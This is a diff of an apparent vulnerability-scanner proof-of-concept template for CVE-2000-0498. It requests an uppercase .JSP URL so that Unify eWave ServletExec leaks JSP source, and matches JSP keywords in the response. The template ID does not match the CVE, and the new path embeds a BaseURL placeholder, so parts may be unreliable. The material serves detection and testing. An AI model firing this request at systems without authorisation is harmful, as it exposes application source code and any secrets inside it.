@@ -1,6 +1,6 @@
 [info]
 author = "ave"
-description = "检测 Unify eWave ServletExec JSP 源代码泄露漏洞，通过请求大写 .JSP 扩展名绕过 JSP 编译执行，直接返回源代码"
+description = "验证 Unify eWave ServletExec JSP 源代码泄露漏洞：通过请求大写 .JSP 扩展名绕过 Servlet 容器编译，直接获取 JSP 源代码"
 id = "POC-AVE-2000-0558"
 name = "CVE-2000-0498 PoC"
 severity = "high"
@@ -15,39 +15,23 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{path}}.JSP"
+path = "/{{BaseURL}}/index.JSP"
 protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
 
 [poc.requests.headers]
 User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
-condition = "or"
 expect = true
 part = "body"
 type = "word"
 words = [
-    "<%@",
     "<%",
-    "java",
+    "%>",
     "import",
-    "jsp:useBean",
-    "jsp:setProperty",
-    "jsp:getProperty",
     "pageContext",
-    "request.getParameter",
-    "response.sendRedirect",
-    "out.println",
-    "session.getAttribute",
-    "application.getAttribute",
+    "jsp:include",
+    "jsp:forward",
+    "<%@",
+    "page language=",
 ]
-
-[[poc.requests.matchers]]
-expect = true
-part = "status"
-status = [200]
-type = "status"
